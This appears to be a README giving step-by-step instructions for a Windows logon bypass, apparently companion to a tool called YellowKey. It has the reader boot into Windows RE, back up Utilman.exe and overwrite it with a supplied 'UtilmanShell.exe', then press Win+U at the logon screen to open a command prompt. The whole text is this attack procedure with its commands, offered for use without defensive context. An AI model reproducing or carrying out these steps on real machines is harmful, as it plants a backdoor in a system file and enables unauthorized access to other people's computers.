## Instructions

1. Prepare the YellowKey following the [original instructions](https://github.com/Nightmare-Eclipse/YellowKey).
2. Copy `UtilmanShell.exe` onto the USB drive.
3. Boot into Windows RE while holding the **Ctrl** key to open a command prompt.
4. Run the following commands in order:
   ```
   pushd C:\Windows\System32\
   copy Utilman.exe Utilman.exe.bak
   copy {USB drive letter}:\UtilmanShell.exe C:\Windows\System32\Utilman.exe
   exit
   ```
5. Boot normally and log in to Windows.
6. Return to the logon screen and press **Win + U**.
7. Log back in — a command prompt window should now appear.
